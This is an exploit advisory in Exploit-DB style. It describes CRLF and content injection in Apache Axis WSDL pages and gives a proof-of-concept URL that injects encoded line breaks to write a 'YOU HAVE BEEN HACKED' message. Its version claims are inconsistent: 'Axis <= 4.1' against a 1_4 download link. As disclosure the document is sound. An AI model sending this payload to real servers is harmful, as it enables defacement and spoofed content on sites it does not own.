# Exploit Title: Apache Axis <= 4.1 CRLF And Content Injection 
# Date: 02/13/2018
# Author website: www.jameelnabbo.com# Vendor Homepage: http://www.apache.org
# Software Link: http://www.apache.org/dyn/closer.cgi/ws/axis/1_4
# Version: < or = 4.1
# Tested on: Linux Ubuntu




1. Description
   
WSDL in Apache Axis is vulnerable to CRLF injection and although, it html encodes all the user's input. and by using %0A and %0D attackers can make new lines and write their fake content etc...

However Apache Axis doesn’t translate the HTML content (XSS) but still translate the HTML Encoded Chars.


2.Proof on concept:

http://localhost/axis/tt_pm4l%0d%0a%0d%0a%0d%0a%0d%0a———————%0d%0a YOU %20 HAVE %20 BEEN %20 HACKED————–%0d%0a%0d%0a%0d%0a.jws?wsdl
